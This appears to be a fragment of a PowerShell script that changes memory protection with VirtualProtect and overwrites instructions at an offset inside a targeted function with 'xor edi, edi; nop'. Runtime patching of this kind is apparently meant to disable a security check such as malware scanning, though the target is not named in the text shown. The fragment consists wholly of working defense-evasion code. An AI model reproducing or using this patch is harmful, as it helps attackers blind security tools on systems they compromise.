...
[int]$p = 27
[IntPtr]$patchloc = [IntPtr]::Add($targetedAddress, $p)


$oldProtectionBuffer1 = 0
[Kernel32]::VirtualProtect($patchloc, [uint32]2, 4, [ref]$oldProtectionBuffer1) | Out-Null

$patch1 = [byte[]] (
    0x31, 0xff,    # xor edi, edi
    0x90           # nop  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch1, 0, $patchloc, 3)
